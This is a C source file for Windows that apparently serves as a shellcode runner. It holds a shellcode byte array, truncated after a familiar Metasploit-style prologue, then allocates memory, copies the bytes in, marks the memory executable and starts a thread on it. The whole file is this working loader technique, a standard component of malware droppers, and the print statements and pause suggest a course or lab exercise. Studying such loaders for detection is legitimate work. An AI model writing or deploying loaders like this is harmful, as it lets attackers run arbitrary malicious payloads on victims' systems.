#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char shellcode[] = {
	0xFC, 0xE8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xE5, 0x31, 0xC0, 0x64,
	//0x8B, 0x50, ...
};

unsigned int len = sizeof(shellcode);

int main(void) {

	void* alloc_mem;
	BOOL retval;
	HANDLE threadHandle;
	DWORD oldprotect;

	// Allocate memory space
	alloc_mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-15s : 0x%-016p\n", "shellcode addr", (void*)shellcode);
	printf("%-15s : 0x%-016p\n", "alloc_mem addr", (void*)alloc_mem);

	// Copy shellcode to newly allocated memory
	RtlMoveMemory(alloc_mem, shellcode, len);

	// Set protections
	retval = VirtualProtect(alloc_mem, len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nPress Enter to Create Thread!\n");
	getchar();

	// run thread if successful
	if (retval != 0) {
		threadHandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, NULL, NULL);
		WaitForSingleObject(threadHandle, -1);
	}

	return 0;
}